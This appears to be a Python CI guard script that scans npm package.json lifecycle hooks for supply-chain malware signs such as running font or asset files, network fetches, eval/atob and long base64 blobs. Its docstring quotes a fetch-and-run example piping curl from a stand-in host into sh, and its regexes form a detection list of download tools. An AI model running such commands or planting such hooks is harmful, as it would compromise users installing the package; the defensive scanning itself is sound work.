"""Guard D — npm package.json lifecycle hooks.

The historical incident included a launcher that ran a JavaScript payload
disguised as a font asset. One delivery vector for that class of attack is a
*lifecycle hook* (``preinstall`` / ``install`` / ``postinstall`` /
``prepare`` / ``prepublish`` / ``prepublishOnly``) that executes a
binary/asset path or fetches code from the network at install time.

Scope (explicit, intentionally narrow):
  * enumerates tracked ``package.json`` files via ``git ls-files -z`` (so
    paths with spaces/newlines survive) and excludes ``tests/guard/fixtures/``
    exactly like ``guard_assets.py``
  * only the lifecycle keys listed above are inspected; ordinary
    ``scripts.build`` / ``scripts.test`` etc. are NOT inspected
  * signals checked inside a lifecycle hook — evaluated on the WHOLE command
    string, so an allow-listed prefix cannot mask a payload suffix
    (``husky install && curl evil.test | sh`` is caught):
    - reference to a binary/asset path (``*.woff2``, ``*.ttf``, ``*.otf``,
      ``*.eot``, ``*.llf``, ``dist/``, ``public/fonts/``, ``assets/``, or a
      ``.js`` executed from outside ``scripts/``)
    - network fetch (``curl``, ``wget``, ``Invoke-WebRequest``, ``irm``,
      ``Invoke-RestMethod``)
    - obfuscation markers (``eval(``, ``atob(``) and base64 blobs > 120 chars

ALLOWED patterns (suppress noise only — they do NOT short-circuit danger
checks; an allow-listed command is still scanned for the signals above):
  * husky install, pinst enable/disable, patch-package
  * npm/yarn/pnpm run <script> (with common flags)
  * node-gyp, tsc, lerna run, corepack enable/prepare
  * node ./scripts/<file>.js  (project scripts under scripts/ are legitimate)
  * plain echo / exit 0 / true / :

False-positive policy (documented):
  * A hook that is only a known tool or ``npm run <script>`` passes.
  * Unlisted but non-dangerous commands (for example ``bun install``,
  * ``npm ci``) pass — the guard flags *patterns*, not unfamiliar tool names.
  * If NO tracked ``package.json`` exists (the current state of this repo),
    the guard prints ``inspected 0 file(s)`` and exits 0. This repo is pure
    Rust and has no npm manifest, so this guard is preventive only and its
    production effectiveness is verified by fixtures, not a live target.

NOT claimed:
  - Does NOT execute or interpret the hook commands.
  - Does NOT validate the semantic safety of arbitrary shell in a hook.
  - Does NOT cover ``.npmrc``, ``.yarnrc``, or lockfile injection.
  - Is NOT a general malware detector — it targets the specific
    auto-execution patterns this incident used.
"""

from __future__ import annotations

import argparse
import base64
import binascii
import json
import os
import re
import subprocess
import sys

LIFECYCLE_KEYS = (
    "preinstall", "install", "postinstall",
    "prepare", "prepublish", "prepublishOnly",
)

# Manifest-driven bootstrap commands that are legitimate lifecycle hooks.
# These suppress the "unfamiliar command" noise. They do NOT skip the danger
# checks below — see check_lifecycle_command().
SAFE_LIFECYCLE_PATTERNS: list[str] = [
    r"^\s*husky\s+install\s*(?:--.*)?$",
    r"^\s*pinst\s+(?:--?(?:enable|disable))?\s*$",
    r"^\s*patch-package\s*$",
    r"^\s*npm\s+run\s+\S+(?:\s+--.*)?$",
    r"^\s*yarn\s+run\s+\S+(?:\s+--.*)?$",
    r"^\s*pnpm\s+run\s+\S+(?:\s+--.*)?$",
    r"^\s*node-gyp\s+\S+.*$",
    r"^\s*tsc\s*(?:--.*)?$",
    r"^\s*lerna\s+run\s+.+$",
    r"^\s*corepack\s+(?:enable|prepare)\s*$",
    r"^\s*echo\b.*$",
    r"^\s*exit\s+0\s*$",
    r"^\s*true\s*$",
    r"^\s*:\s*$",
    # project script under scripts/ — legitimate, not an asset
    r"^\s*node\s+\.?/?scripts/\S+\.(?:js|mjs|cjs)\s*(?:--.*)?$",
]
_SAFE = re.compile("|".join(SAFE_LIFECYCLE_PATTERNS), re.IGNORECASE)

# Suspicious: executes a binary/asset path rather than a manifest tool.
# Both the interpreter and the target path are required.
RUNS_ASSET = re.compile(
    # interpreter + file with an asset-like extension, anywhere
    r"(?<![\w./])(?:node|sh|bash|pwsh)\s+\S*\.(?:woff2?|ttf|otf|eot|llf)\b",
    re.IGNORECASE,
)
# interpreter + .js under an asset/seed directory (the incident shape):
# ./dist/setup.js, ./public/fonts/x.js, ./assets/y.js
RUNS_ASSET_SEED = re.compile(
    r"(?<![\w./])(?:node|sh|bash|pwsh)\s+\S*(?:^|/)(?:dist|public/fonts|assets)/\S*\.(?:js|mjs|cjs)\b",
    re.IGNORECASE,
)
# interpreter + ./path with .js that is NOT under scripts/ (project scripts)
RUNS_ASSET_DOT_JS = re.compile(
    r"(?<![\w./])(?:node|sh|bash|pwsh)\s+\./+(?!scripts/)\S*\.(?:js|mjs|cjs)\b",
    re.IGNORECASE,
)

# Suspicious: network fetch anywhere in a lifecycle hook
NETWORK_FETCH = re.compile(
    r"(?<![\w./-])(?:curl|wget|Invoke-WebRequest|irm|Invoke-RestMethod)\b",
    re.IGNORECASE,
)

# Suspicious: obfuscation markers
OBFUSCATION = re.compile(r"\beval\s*\(|\batob\s*\(", re.IGNORECASE)

# Base64 blob longer than 120 chars (a common payload-delivery shape)
BASE64_BLOB = re.compile(r"[A-Za-z0-9+/]{121,}={0,2}")


def _is_safe(cmd: str) -> bool:
    """True only if the *entire* command matches an allow-listed pattern."""
    return _SAFE.match(cmd) is not None


def _looks_like_base64(token: str) -> bool:
    try:
        base64.b64decode(token, validate=True)
        return True
    except (binascii.Error, ValueError):
        return False


def check_lifecycle_command(cmd: str, key: str, rel: str, errors: list[str]) -> None:
    """Run all danger checks against the full lifecycle command string.

    The allow-list does NOT short-circuit: a command that starts with
    ``husky install`` but continues with ``&& curl ... | sh`` is still
    scanned, so chaining/`;`/newline/env-assignment suffixes cannot hide a
    payload behind an allow-listed prefix.
    """
    cmd = cmd.strip()
    if not cmd:
        return

    problems: list[str] = []
    if RUNS_ASSET.search(cmd):
        problems.append(
            f"executes a binary/asset path rather than a manifest ({cmd[:80]!r})"
        )
    if RUNS_ASSET_SEED.search(cmd):
        problems.append(
            f"executes a .js file from an asset/build directory ({cmd[:80]!r})"
        )
    if RUNS_ASSET_DOT_JS.search(cmd):
        problems.append(f"executes a .js file outside scripts/ ({cmd[:80]!r})")
    if NETWORK_FETCH.search(cmd):
        problems.append(f"performs a network fetch at install time ({cmd[:80]!r})")
    if OBFUSCATION.search(cmd):
        problems.append(f"uses eval()/atob() obfuscation markers ({cmd[:80]!r})")

    blob = BASE64_BLOB.search(cmd)
    if blob and _looks_like_base64(blob.group(0)):
        problems.append(
            f"contains a base64 blob longer than 120 chars "
            f"({blob.group(0)[:40]}...)"
        )

    for p in problems:
        errors.append(f"{rel}: scripts.{key} {p}")


def tracked_package_jsons(root: str) -> list[str]:
    """Tracked package.json files under *root*, excluding test fixtures.

    -z keeps NUL-delimited output so paths containing spaces/newlines survive.

    Returns absolute paths (resolved against *root*) so the manifests are
    found regardless of the current working directory; diagnostic messages
    keep the repo-relative form (see main()).
    """
    out = subprocess.run(
        ["git", "-C", root, "ls-files", "-z"],
        capture_output=True, check=True,
    ).stdout
    result = []
    for raw in out.split(b"\x00"):
        if not raw:
            continue
        path = os.fsdecode(raw)
        if path.startswith("tests/guard/fixtures/"):
            continue
        if os.path.basename(path) == "package.json":
            result.append(os.path.join(root, path))
    return result


def _repo_rel(path: str, root: str) -> str:
    """Repo-relative form of *path* for diagnostics, robust to any CWD."""
    try:
        return os.path.relpath(path, root)
    except ValueError:
        return path


def check_package_json(path: str, errors: list[str], rel: str) -> None:
    """Inspect one package.json's lifecycle hooks. Appends error strings."""
    try:
        with open(path, "r", encoding="utf-8") as fh:
            data = json.load(fh)
    except (OSError, json.JSONDecodeError) as exc:
        errors.append(f"{rel}: cannot parse JSON: {exc}")
        return
    if not isinstance(data, dict):
        errors.append(f"{rel}: top-level JSON must be an object")
        return

    scripts = data.get("scripts")
    if scripts is None:
        return
    if not isinstance(scripts, dict):
        errors.append(f"{rel}: 'scripts' must be an object")
        return

    for key in LIFECYCLE_KEYS:
        val = scripts.get(key)
        if val is None:
            continue
        if not isinstance(val, str):
            errors.append(
                f"{rel}: scripts.{key} must be a string, got {type(val).__name__}"
            )
            continue
        check_lifecycle_command(val, key, rel, errors)


def main() -> int:
    parser = argparse.ArgumentParser(description="npm lifecycle hook guard")
    parser.add_argument("--root", default=".", help="repository root for git ls-files")
    parser.add_argument("--paths", nargs="*", default=None,
                        help="explicit package.json paths (fail loud if any missing)")
    args = parser.parse_args()

    errors: list[str] = []
    inspected: list[str] = []

    if args.paths:
        missing = [p for p in args.paths if not os.path.isfile(p)]
        if missing:
            for p in missing:
                print(f"::error file={p}::explicitly requested package.json path does not exist")
            return 1
        targets = [(p, _repo_rel(p, args.root)) for p in args.paths]
    else:
        # Absolute paths resolved against --root: a guard invoked from another
        # working directory must still inspect every tracked manifest.
        targets = [(p, _repo_rel(p, args.root)) for p in tracked_package_jsons(args.root)]
        if targets and not any(os.path.isfile(p) for p, _ in targets):
            for path, rel in targets:
                if not os.path.isfile(path):
                    print(f"::error file={rel}::tracked package.json not found "
                          f"(resolved against --root {args.root!r})")
            print(f"inspected 0 package.json file(s), {len(targets)} problem(s)")
            return 1

    for path, rel in targets:
        if os.path.isfile(path):
            inspected.append(rel)
            check_package_json(path, errors, rel)

    for err in errors:
        print(f"::error::{err}")
    print(f"inspected {len(inspected)} package.json file(s), {len(errors)} problem(s)")
    return 1 if errors else 0


if __name__ == "__main__":
    sys.exit(main())
